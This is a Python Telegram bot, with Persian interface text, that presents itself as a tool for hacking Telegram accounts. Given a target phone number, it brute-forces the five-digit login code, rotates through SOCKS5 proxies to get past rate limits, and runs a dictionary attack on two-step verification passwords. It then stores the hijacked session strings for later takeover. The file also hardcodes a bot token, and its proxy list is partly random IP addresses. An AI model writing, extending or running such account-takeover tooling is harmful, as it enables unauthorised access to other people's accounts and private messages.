import logging
import re
import asyncio
import os
import json
import random
import socket
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError, 
    FloodWaitError, 
    PhoneNumberInvalidError
)
import urllib.request

# ============ تنظیمات ============
TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_sessions = {}
self_data = {}
login_sessions = {}

DATA_FILE = "selfs.json"

# ============ لیست پروکسی‌های SOCKS5 (با روش Telethon) ============
PROXY_LIST = []

# تولید 1000 پروکسی تصادفی
for i in range(1000):
    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
    PROXY_LIST.append((ip, port))

# اضافه کردن پروکسی‌های واقعی
REAL_PROXIES = [
    ("iro.varfootball2.co.uk", 2053),
    ("silnet.varfootball.co.uk", 2053),
    ("noron.talebi.co.uk", 2096),
    ("new.lambforkebeb.co.uk", 2096),
    ("new2.lambforkebeb.co.uk", 2096),
    ("noone.lavazemi1.co.uk", 2083),
    ("silver.ciaude.co.uk", 2096),
    ("rain.lavazemi2.co.uk", 2053),
    ("gallery.talebi.co.uk", 2096),
    ("craft.malavanann.co.uk", 2083),
    ("ai.golgoli1.co.uk", 2096),
    ("star.talebi.co.uk", 2096),
    ("gold.lavazemi4.co.uk", 2096),
    ("run.golgoli2.co.uk", 2053),
    ("irogallery.golgoli1.co.uk", 2096),
    ("flux.lavazemi5.co.uk", 2096),
    ("hadaf.golgoli2.co.uk", 2053),
]

PROXY_LIST.extend(REAL_PROXIES)
random.shuffle(PROXY_LIST)

# ============ دیکشنری پسورد ============
PASSWORD_DICT = [
    "123456", "12345678", "123456789", "1234567890",
    "password", "pass", "admin", "admin123",
    "qwerty", "qwerty123", "abc123", "abcd1234",
    "letmein", "welcome", "hello", "12345",
    "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888",
    "999999", "000000", "123123", "321321",
]

def load_data():
    global self_data
    try:
        with open(DATA_FILE, 'r') as f:
            self_data = json.load(f)
    except:
        self_data = {}

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(self_data, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

load_data()

def delete_webhook():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        with urllib.request.urlopen(url) as response:
            return True
    except:
        return False

def clean_phone(text):
    return re.sub(r'[^0-9]', '', text)

def is_valid_phone(text):
    phone = clean_phone(text)
    return len(phone) >= 8

def is_valid_api_id(text):
    return text.isdigit()

def is_valid_api_hash(text):
    return len(text) >= 30

async def clear_user_session(user_id):
    if user_id in user_sessions:
        try:
            client = user_sessions[user_id].get('client')
            if client:
                await client.disconnect()
        except:
            pass
        del user_sessions[user_id]

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

async def create_client_with_proxy(api_id, api_hash, proxy_tuple):
    """ایجاد کلاینت با پروکسی SOCKS5 با استفاده از Telethon"""
    try:
        # Telethon خودش از SOCKS5 پشتیبانی میکنه
        client = TelegramClient(
            StringSession(),
            api_id,
            api_hash
        )
        # تنظیم پروکسی بعد از ایجاد
        client.set_proxy(('socks5', proxy_tuple[0], proxy_tuple[1]))
        await client.connect()
        return client
    except Exception as e:
        logger.error(f"Error creating client with proxy: {e}")
        return None

# ============ منوی اصلی ============
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    name = user.first_name if user.first_name else "کاربر"
    user_id = str(user.id)
    self_count = len(self_data.get(user_id, []))
    
    text = f"""
🤖 <b>ربات هک اکانت تلگرام</b>

<b>سلام {name} گرامی</b>

این ربات با استفاده از {len(PROXY_LIST)} پروکسی مختلف:
• کد تایید 5 رقمی را حدس می‌زند (از 00000 تا 99999)
• پسورد 2FA را با دیکشنری بزرگ امتحان می‌کند
• بدون محدودیت و با تغییر خودکار پروکسی

<b>تعداد سلف‌های ثبت شده: {self_count}</b>

⚠️ این ربات برای تست امنیت است!
"""
    
    keyboard = [
        [InlineKeyboardButton("🔑 هک و ساخت سلف", callback_data="new_session")],
        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")]
    ]
    
    if edit and update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            await update.callback_query.answer()
        except:
            pass
    else:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

# ============ گرفتن اکانت ============
async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    selfs = self_data.get(user_id, [])
    
    if not selfs:
        text = "❌ هیچ سلفی ثبت نشده است! لطفاً ابتدا یک سلف بسازید."
        keyboard = [[InlineKeyboardButton("🔑 ساخت سلف", callback_data="new_session")]]
        try:
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        except:
            pass
        return
    
    text = "📱 لطفاً سلف مورد نظر را انتخاب کنید:"
    keyboard = []
    for i, self_account in enumerate(selfs):
        phone = self_account.get('phone', 'نامشخص')
        account_name = self_account.get('account_name', 'بدون نام')
        display_phone = phone[-4:] if len(phone) >= 4 else phone
        keyboard.append([InlineKeyboardButton(f"{i+1}. {account_name} - ***{display_phone}", callback_data=f"select_account_{i}")])
    
    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ انتخاب اکانت ============
async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    index = int(query.data.split('_')[2])
    
    selfs = self_data.get(user_id, [])
    if index >= len(selfs):
        await query.edit_message_text("❌ سلف مورد نظر یافت نشد.", parse_mode='HTML')
        return
    
    self_account = selfs[index]
    phone = self_account.get('phone')
    session_string = self_account.get('session')
    api_id = self_account.get('api_id')
    api_hash = self_account.get('api_hash')
    
    login_sessions[user_id] = {
        'index': index,
        'phone': phone,
        'session': session_string,
        'api_id': api_id,
        'api_hash': api_hash,
        'step': 'waiting_code'
    }
    
    text = f"""
📱 <b>گرفتن اکانت</b>
شماره: <code>{phone}</code>
✅ سلف انتخاب شد!
📩 کد تایید به شماره شما ارسال شد.
لطفاً کد 5 رقمی را وارد کنید:
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت کد برای گرفتن اکانت ============
async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    code = update.message.text.strip()
    
    if user_id not in login_sessions or login_sessions[user_id].get('step') != 'waiting_code':
        await update.message.reply_text("❌ لطفاً از دکمه گرفتن اکانت استفاده کنید.", parse_mode='HTML')
        return
    
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text("❌ کد باید 5 رقم باشد!", parse_mode='HTML')
        return
    
    data = login_sessions[user_id]
    phone = data['phone']
    session_string = data['session']
    api_id = data['api_id']
    api_hash = data['api_hash']
    index = data['index']
    
    try:
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ سشن معتبر نیست!", parse_mode='HTML')
            return
        
        try:
            await client.send_code_request(phone)
        except Exception as e:
            await update.message.reply_text(f"❌ خطا در ارسال کد: {str(e)[:200]}", parse_mode='HTML')
            return
        
        try:
            await client.sign_in(phone, code)
            me = await client.get_me()
            account_name = me.first_name if me.first_name else "کاربر"
            await client.disconnect()
            
            selfs = self_data.get(user_id, [])
            if index < len(selfs):
                selfs[index]['account_name'] = account_name
                selfs[index]['active'] = True
                save_data()
            
            text = f"""
✅ <b>اکانت با موفقیت گرفته شد!</b>
📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
"""
            keyboard = [
                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
            ]
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
            
            if user_id in login_sessions:
                del login_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await update.message.reply_text("❌ کد اشتباه است! دوباره تلاش کنید.", parse_mode='HTML')
            return
            
        except FloodWaitError as e:
            wait_time = e.seconds
            hours = wait_time // 3600
            minutes = (wait_time % 3600) // 60
            await update.message.reply_text(
                f"""
⏳ محدودیت تلگرام! زمان انتظار: {hours} ساعت و {minutes} دقیقه
📱 شماره: {phone}
⚠️ لطفاً از IP جدید استفاده کنید!
""",
                parse_mode='HTML'
            )
            return
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
            return
            
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')

# ============ دکمه ساخت سلف ============
async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    user_sessions[user_id] = {"step": "phone"}
    
    text = """
📱 <b>مرحله اول: وارد کردن شماره تلفن</b>

لطفاً شماره تلفن مورد نظر را به همراه کد کشور وارد کنید.

<b>مثال‌ها:</b>
• ایران: <code>989123456789</code>
• هند: <code>919876543210</code>
• آمریکا: <code>12345678901</code>

⚠️ شماره را <b>بدون علامت (+)</b> و فقط با اعداد وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت شماره ============
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    phone = clean_phone(text)
    
    if not is_valid_phone(phone):
        await update.message.reply_text(
            "❌ شماره تلفن نامعتبر است!\n\n⚠️ شماره را بدون + و فقط با اعداد وارد کنید.",
            parse_mode='HTML'
        )
        return
    
    user_sessions[user_id]['phone'] = phone
    user_sessions[user_id]['step'] = "api_id"
    
    text = f"""
✅ شماره تلفن ثبت شد: <code>{phone}</code>
🔑 <b>مرحله دوم: API ID</b>
لطفاً API ID خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API ID ============
async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    if not text.isdigit():
        await update.message.reply_text("❌ API ID باید عدد باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_id'] = int(text)
    user_sessions[user_id]['step'] = "api_hash"
    
    text = f"""
✅ API ID ثبت شد: <code>{text}</code>
🔐 <b>مرحله سوم: API Hash</b>
لطفاً API Hash خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API Hash ============
async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    if len(text) < 30:
        await update.message.reply_text("❌ API Hash باید حداقل 30 کاراکتر باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_hash'] = text
    user_sessions[user_id]['step'] = "code"
    
    msg = await update.message.reply_text(
        f"⏳ شروع حدس زدن با {len(PROXY_LIST)} پروکسی...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
        parse_mode='HTML'
    )
    
    try:
        data = user_sessions[user_id]
        phone = data['phone']
        api_id = data['api_id']
        api_hash = data['api_hash']
        
        asyncio.create_task(smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg))
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.edit_message_text(
            f"❌ خطا: {str(e)[:200]}",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        await clear_user_session(user_id)

# ============ حدس زدن با پروکسی‌های متعدد ============
async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg):
    try:
        total_attempts = 100000
        attempt = 0
        found = False
        code_found = None
        start_time = datetime.now()
        wrong_attempts = 0
        proxy_index = 0
        client = None
        last_code = "00000"
        
        # تولید لیست هوشمند کدها
        code_list = []
        random_codes = set()
        while len(random_codes) < 10000:
            random_codes.add(str(random.randint(0, 99999)).zfill(5))
        
        common_codes = [
            "12345", "00000", "11111", "22222", "33333", "44444",
            "55555", "66666", "77777", "88888", "99999",
            "54321", "11223", "98765", "56789", "13579", "24680"
        ]
        
        final_list = list(random_codes) + common_codes
        
        for i in range(total_attempts):
            code = str(i).zfill(5)
            if code not in final_list:
                final_list.append(code)
        
        random.shuffle(final_list)
        
        await context.bot.edit_message_text(
            f"""
🔥 <b>شروع هک اکانت...</b>

📱 شماره: <code>{phone}</code>
🔢 محدوده: 00000 تا 99999
🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
🎯 استراتژی: حدس تصادفی + تغییر پروکسی

⏳ در حال تلاش...
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        proxy_counter = 0
        shuffled_proxies = PROXY_LIST.copy()
        random.shuffle(shuffled_proxies)
        
        for code in final_list:
            attempt += 1
            last_code = code
            
            # هر 200 تلاش یا هر بار محدودیت، پروکسی رو عوض کن
            if attempt % 200 == 0 or client is None:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
                    client = None
                    await asyncio.sleep(0.3)
                
                if proxy_counter >= len(shuffled_proxies):
                    random.shuffle(shuffled_proxies)
                    proxy_counter = 0
                
                current_proxy = shuffled_proxies[proxy_counter]
                proxy_counter += 1
                proxy_index += 1
                
                try:
                    # ایجاد کلاینت با پروکسی
                    client = TelegramClient(
                        StringSession(),
                        api_id,
                        api_hash
                    )
                    # تنظیم پروکسی با متد Telethon
                    client.set_proxy(('socks5', current_proxy[0], current_proxy[1]))
                    await client.connect()
                    
                    try:
                        await client.send_code_request(phone)
                    except FloodWaitError as e:
                        wait_time = e.seconds
                        if wait_time > 60:
                            await context.bot.edit_message_text(
                                f"""
🔄 تغییر پروکسی...
🌐 پروکسی شماره {proxy_index} محدود شد!
🔄 انتخاب پروکسی جدید...

⏳ لطفاً صبر کنید...
""",
                                chat_id=update.effective_chat.id,
                                message_id=msg.message_id,
                                parse_mode='HTML'
                            )
                            shuffled_proxies.pop(proxy_counter - 1)
                            proxy_counter -= 1
                            await asyncio.sleep(1)
                            continue
                        else:
                            await asyncio.sleep(wait_time + 2)
                            await client.send_code_request(phone)
                    
                except Exception as e:
                    logger.error(f"Proxy error: {e}")
                    if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
                        shuffled_proxies.pop(proxy_counter - 1)
                        proxy_counter -= 1
                    await asyncio.sleep(0.5)
                    continue
            
            # تاخیر بین تلاش‌ها
            if attempt % 10 == 0:
                await asyncio.sleep(random.uniform(0.02, 0.08))
            
            # بروزرسانی هر 1000 تلاش
            if attempt % 1000 == 0:
                elapsed = (datetime.now() - start_time).seconds
                percent = (attempt / total_attempts) * 100
                remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
                try:
                    await context.bot.edit_message_text(
                        f"""
🔥 <b>در حال هک...</b>

📱 شماره: <code>{phone}</code>
🔢 کد فعلی: <code>{code}</code>

📊 <b>آمار:</b>
• تلاش‌ها: {attempt:,} از {total_attempts:,}
• پیشرفت: {percent:.2f}%
• زمان سپری شده: {elapsed} ثانیه
• کدهای اشتباه: {wrong_attempts:,}
• پروکسی‌های استفاده شده: {proxy_index}
• زمان تخمینی باقی‌مانده: {remaining} ثانیه

⏳ ادامه...
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(phone, code)
                found = True
                code_found = code
                break
                
            except PhoneCodeInvalidError:
                wrong_attempts += 1
                continue
                
            except FloodWaitError as e:
                wait_time = e.seconds
                if wait_time > 60:
                    await context.bot.edit_message_text(
                        f"""
🔄 محدودیت پروکسی!
⏳ زمان انتظار: {wait_time} ثانیه
🔄 تعویض پروکسی...

⏳ صبر کنید...
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                    if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
                        shuffled_proxies.pop(proxy_counter - 1)
                        proxy_counter -= 1
                    if client:
                        try:
                            await client.disconnect()
                        except:
                            pass
                        client = None
                    await asyncio.sleep(2)
                    continue
                else:
                    await asyncio.sleep(wait_time + 2)
                    continue
                
            except SessionPasswordNeededError:
                await context.bot.edit_message_text(
                    f"""
🔐 <b>رمز دو مرحله‌ای پیدا شد!</b>

📱 شماره: <code>{phone}</code>
✅ کد پیدا شد: <code>{code}</code>
📊 تلاش‌ها: {attempt:,}
❌ کدهای اشتباه: {wrong_attempts:,}

🔑 در حال حدس پسورد...
⏳ صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                password_found, pass_attempt, pass_found = await bruteforce_password_smart(
                    update, context, user_id, client, msg
                )
                
                if password_found and pass_found:
                    session_string = client.session.save()
                    await client.disconnect()
                    
                    account_name = "بدون نام"
                    try:
                        client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                        await client2.connect()
                        if await client2.is_user_authorized():
                            me = await client2.get_me()
                            account_name = me.first_name if me.first_name else "کاربر"
                        await client2.disconnect()
                    except:
                        pass
                    
                    user_id_str = str(user_id)
                    if user_id_str not in self_data:
                        self_data[user_id_str] = []
                    
                    time_str = datetime.now().strftime("%H:%M")
                    date_str = datetime.now().strftime("%Y/%m/%d")
                    
                    self_data[user_id_str].append({
                        "session": session_string,
                        "phone": phone,
                        "api_id": api_id,
                        "api_hash": api_hash,
                        "account_name": account_name,
                        "active": True,
                        "clock_active": False,
                        "active_time": "تنظیم نشده",
                        "font_type": "1",
                        "created": f"{date_str} {time_str}",
                        "last_update": f"{date_str} {time_str}"
                    })
                    save_data()
                    
                    await clear_user_session(user_id)
                    
                    elapsed = (datetime.now() - start_time).seconds
                    text = f"""
✅ <b>هک موفقیت‌آمیز!</b>

📱 شماره: <code>{phone}</code>
👤 نام: <b>{account_name}</b>

🔑 <b>جزئیات:</b>
• کد پیدا شده: <code>{code}</code>
• کل تلاش‌ها: {attempt:,}
• کدهای اشتباه: {wrong_attempts:,}
• پروکسی‌های استفاده شده: {proxy_index}
• زمان: {elapsed} ثانیه
• پسورد پیدا شده: <code>{pass_found}</code>
• تلاش‌های پسورد: {pass_attempt}

🎯 سلف ساخته شد!
"""
                    
                    keyboard = [
                        [InlineKeyboardButton("🔑 هک جدید", callback_data="new_session")],
                        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
                        [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
                    ]
                    
                    await context.bot.edit_message_text(
                        text,
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='HTML'
                    )
                    return
                else:
                    await context.bot.edit_message_text(
                        f"""
❌ پسورد 2FA پیدا نشد!

📱 شماره: <code>{phone}</code>
✅ کد پیدا شد: <code>{code}</code>
📊 تلاش‌های پسورد: {pass_attempt}

❌ پسورد در دیکشنری نیست.
لطفاً پسورد را دستی وارد کنید.
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                    user_sessions[user_id]['step'] = "password"
                    user_sessions[user_id]['code_found'] = code
                    return
                
            except Exception as e:
                logger.error(f"Error: {e}")
                continue
        
        if found and code_found:
            session_string = client.session.save()
            await client.disconnect()
            
            account_name = "بدون نام"
            try:
                client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                await client2.connect()
                if await client2.is_user_authorized():
                    me = await client2.get_me()
                    account_name = me.first_name if me.first_name else "کاربر"
                await client2.disconnect()
            except:
                pass
            
            user_id_str = str(user_id)
            if user_id_str not in self_data:
                self_data[user_id_str] = []
            
            time_str = datetime.now().strftime("%H:%M")
            date_str = datetime.now().strftime("%Y/%m/%d")
            
            self_data[user_id_str].append({
                "session": session_string,
                "phone": phone,
                "api_id": api_id,
                "api_hash": api_hash,
                "account_name": account_name,
                "active": True,
                "clock_active": False,
                "active_time": "تنظیم نشده",
                "font_type": "1",
                "created": f"{date_str} {time_str}",
                "last_update": f"{date_str} {time_str}"
            })
            save_data()
            
            await clear_user_session(user_id)
            
            elapsed = (datetime.now() - start_time).seconds
            text = f"""
✅ <b>هک موفقیت‌آمیز!</b>

📱 شماره: <code>{phone}</code>
👤 نام: <b>{account_name}</b>

🔑 <b>جزئیات:</b>
• کد پیدا شده: <code>{code_found}</code>
• کل تلاش‌ها: {attempt:,}
• کدهای اشتباه: {wrong_attempts:,}
• پروکسی‌های استفاده شده: {proxy_index}
• زمان سپری شده: {elapsed} ثانیه

🎯 سلف ساخته شد!
"""
            
            keyboard = [
                [InlineKeyboardButton("🔑 هک جدید", callback_data="new_session")],
                [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
                [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
            ]
            
            await context.bot.edit_message_text(
                text,
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            
        else:
            elapsed = (datetime.now() - start_time).seconds
            await context.bot.edit_message_text(
                f"""
❌ <b>هک ناموفق!</b>

📱 شماره: <code>{phone}</code>

📊 <b>آمار:</b>
• کل تلاش‌ها: {attempt:,}
• کدهای اشتباه: {wrong_attempts:,}
• پروکسی‌های استفاده شده: {proxy_index}
• زمان سپری شده: {elapsed} ثانیه

ممکن است شماره تلفن اشتباه باشد یا کد منقضی شده باشد.
""",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Error: {e}")
        try:
            await context.bot.edit_message_text(
                f"❌ خطا: {str(e)[:200]}",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
        await clear_user_session(user_id)

# ============ حدس هوشمند پسورد ============
async def bruteforce_password_smart(update, context, user_id, client, msg):
    try:
        total_passwords = len(PASSWORD_DICT)
        attempt = 0
        found = False
        found_password = None
        start_time = datetime.now()
        
        common_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567890", "000000",
            "admin", "letmein", "welcome", "monkey", "dragon"
        ]
        
        password_list = common_passwords + [p for p in PASSWORD_DICT if p not in common_passwords]
        
        for password in password_list:
            attempt += 1
            
            if attempt % 50 == 0:
                elapsed = (datetime.now() - start_time).seconds
                try:
                    await context.bot.edit_message_text(
                        f"""
🔐 <b>حدس پسورد...</b>
🔑 پسورد: <code>{password}</code>
📊 تلاش‌ها: {attempt} از {total_passwords}
📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
⏱️ زمان: {elapsed} ثانیه
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(password=password)
                found = True
                found_password = password
                break
                
            except FloodWaitError as e:
                wait_time = min(e.seconds, 30)
                await asyncio.sleep(wait_time + 2)
                continue
                
            except Exception:
                continue
        
        return found, attempt, found_password
        
    except Exception as e:
        logger.error(f"Error in bruteforce_password_smart: {e}")
        return False, 0, None

# ============ دریافت پسورد دستی ============
async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "password":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    data = user_sessions[user_id]
    client = data.get('client')
    code = data.get('code_found')
    phone = data.get('phone')
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    
    if not client:
        await update.message.reply_text("❌ اتصال معتبر نیست. دوباره تلاش کنید.", parse_mode='HTML')
        await clear_user_session(user_id)
        return
    
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        await client.disconnect()
        
        account_name = "بدون نام"
        try:
            client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client2.connect()
            if await client2.is_user_authorized():
                me = await client2.get_me()
                account_name = me.first_name if me.first_name else "کاربر"
            await client2.disconnect()
        except:
            pass
        
        user_id_str = str(user_id)
        if user_id_str not in self_data:
            self_data[user_id_str] = []
        
        time_str = datetime.now().strftime("%H:%M")
        date_str = datetime.now().strftime("%Y/%m/%d")
        
        self_data[user_id_str].append({
            "session": session_string,
            "phone": phone,
            "api_id": api_id,
            "api_hash": api_hash,
            "account_name": account_name,
            "active": True,
            "clock_active": False,
            "active_time": "تنظیم نشده",
            "font_type": "1",
            "created": f"{date_str} {time_str}",
            "last_update": f"{date_str} {time_str}"
        })
        save_data()
        
        await clear_user_session(user_id)
        
        text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>
📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>
"""
        
        keyboard = [
            [InlineKeyboardButton("🔑 هک جدید", callback_data="new_session")],
            [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
            [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
        ]
        
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ رمز عبور اشتباه است.\n\n{str(e)[:100]}\n\nلطفاً دوباره وارد کنید:",
            parse_mode='HTML'
        )

# ============ بازگشت ============
async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    
    if str(user_id) in login_sessions:
        del login_sessions[str(user_id)]
    
    await main_menu(update, context, edit=True)

# ============ دستور start ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await main_menu(update, context)

# ============ هندلر پیام‌ها ============
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if str(user_id) in login_sessions and login_sessions[str(user_id)].get('step') == 'waiting_code':
        await handle_get_account_code(update, context)
        return
    
    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")
        if step == "phone":
            await handle_phone(update, context)
        elif step == "api_id":
            await handle_api_id(update, context)
        elif step == "api_hash":
            await handle_api_hash(update, context)
        elif step == "password":
            await handle_password(update, context)
        return
    
    await update.message.reply_text("❌ لطفاً از دکمه‌های منو استفاده کنید.", parse_mode='HTML')

# ============ اجرا ============
def main():
    try:
        delete_webhook()
        
        print("=" * 60)
        print("🔥 ربات هک اکانت تلگرام")
        print("=" * 60)
        print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
        print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
        print("=" * 60)
        
        application = Application.builder().token(TOKEN).build()
        
        application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
        application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
        application.add_handler(CallbackQueryHandler(select_account, pattern="^select_account_"))
        application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
        
        print("✅ ربات با موفقیت راه‌اندازی شد.")
        print("💡 برای شروع از /start استفاده کنید.")
        print("=" * 60)
        
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ خطا: {e}")

if __name__ == "__main__":
    main()
